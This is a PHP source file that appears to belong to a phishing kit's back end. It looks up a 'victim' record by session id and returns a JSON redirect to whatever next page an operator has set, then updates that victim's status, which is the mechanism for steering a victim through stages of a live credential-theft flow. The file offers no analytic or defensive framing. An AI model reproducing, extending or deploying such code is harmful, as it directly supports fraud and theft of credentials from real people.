<?php
require_once 'db.php';

header('Content-Type: application/json');
$session_id = $_GET['sid'] ?? '';

if (!$session_id) {
    echo json_encode(['redirect' => false]);
    exit;
}

$v = getVictim($session_id);
if (!$v) {
    echo json_encode(['redirect' => false]);
    exit;
}

if ($v['next_step'] && $v['next_step'] !== 'awaiting' && $v['next_step'] !== $v['status'] && $v['next_step'] !== '') {
    $lang = isset($_GET['lang']) ? $_GET['lang'] : 'en';
    echo json_encode([
        'redirect' => true,
        'url' => $v['next_step'] . '.php?sid=' . urlencode($session_id) . '&lang=' . $lang
    ]);
    updateVictim($session_id, ['status' => $v['next_step']]);
} else {
    echo json_encode(['redirect' => false]);
}
?>
